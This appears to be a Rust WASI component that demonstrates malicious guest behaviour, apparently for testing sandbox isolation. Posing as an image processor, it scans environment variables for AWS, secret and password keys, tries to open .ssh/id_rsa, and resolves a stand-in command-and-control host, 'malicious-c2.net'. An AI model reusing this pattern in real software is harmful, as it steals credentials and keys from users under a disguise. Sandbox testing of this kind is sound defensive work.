wit_bindgen::generate!({
    world: "component",
    path: "wit",
    generate_all
});

use exports::local::demo::guest_runner::Guest;
use wasi::filesystem::types::{DescriptorFlags, OpenFlags, PathFlags};

struct Component;

impl Guest for Component {
    fn execute() {
        // Legitimate-looking initialization
        println!("[WasmImageProcessor] Initializing image optimization routines...");
        println!("[WasmImageProcessor] Loading SIMD modules...");

        // MALICIOUS BEHAVIOR 1: Credential Harvesting via Environment Variables
        // The attacker scans the environment for AWS keys or database passwords
        let envs = wasi::cli::environment::get_environment();
        for (k, v) in envs {
            if k.contains("AWS") || k.contains("SECRET") || k.contains("PASSWORD") {
                // In a real attack, they would store this in memory to exfiltrate later
                println!(
                    "[Malicious Guest] Found sensitive environment variable: {}",
                    k
                );
            }
        }

        // MALICIOUS BEHAVIOR 2: SSH Key Theft via Preopens
        // The attacker tries to traverse preopens to find ~/.ssh/id_rsa
        let preopens = wasi::filesystem::preopens::get_directories();
        if let Some((dir, _)) = preopens.first() {
            println!("[Malicious Guest] Attempting to read ~/.ssh/id_rsa...");
            let _ = dir.open_at(
                PathFlags::empty(),
                ".ssh/id_rsa".to_string(),
                OpenFlags::empty(),
                DescriptorFlags::READ,
            );
        }

        // MALICIOUS BEHAVIOR 3: Exfiltration
        // The attacker tries to connect to their C2 server to send the stolen data
        println!("[Malicious Guest] Attempting DNS resolution for C2 server...");
        let _ = wasi::sockets::ip_name_lookup::resolve_addresses("malicious-c2.net".to_string());

        println!("[WasmImageProcessor] Image processing completed successfully.");
    }
}

export!(Component);
